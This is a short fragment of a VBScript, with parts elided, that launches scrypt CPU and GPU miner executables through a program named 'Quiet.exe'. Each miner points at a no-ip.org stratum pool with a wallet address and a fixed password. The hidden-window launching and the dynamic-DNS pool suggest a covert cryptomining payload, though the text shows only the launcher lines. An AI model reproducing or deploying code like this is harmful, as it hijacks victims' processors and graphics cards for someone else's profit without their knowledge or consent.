...
objshell.run "Quiet.exe" & " " & "ScryptCPU32.EXE" & " " & "-a scrypt -o stratum+tcp://birdspool.no-ip.org:5556 -u" & " " & WalletADR & " " & "-p 912837465" & " " & "--threads" & " " & threads 
End If
If Arch="X64" Then
objShell.CurrentDirectory = ".\Scrypt"
End If 
If CPUMine=1 and Arch="X64" Then
objshell.run "Quiet.exe" & " " & "ScryptCPU64.EXE" & " " & "-a scrypt -o stratum+tcp://birdspool.no-ip.org:5556 -u" & " " & WalletADR & " " & "-p 912837465" & " " & "--threads" & " " & threads 
End If
If OCL=0 Then
...
objshell.run "Quiet.exe" & " " & "ScryptGPU.EXE" & " " & "--Intensity D -o stratum+tcp://birdspool.no-ip.org:5556 -u" & " " & WalletADR & " " & "-p 912837465"
End If
If OCL=1 and Cuda = 1 Then 
objShell.CurrentDirectory = ".\ScryptGPU"
 objShell.run "Quiet.exe" & " " & "ScryptNVGPU.EXE" & " " & "-a scrypt -o stratum+tcp://birdspool.no-ip.org:3333 -u" & " " & WalletADR & " " & "-p 912837465"
End If
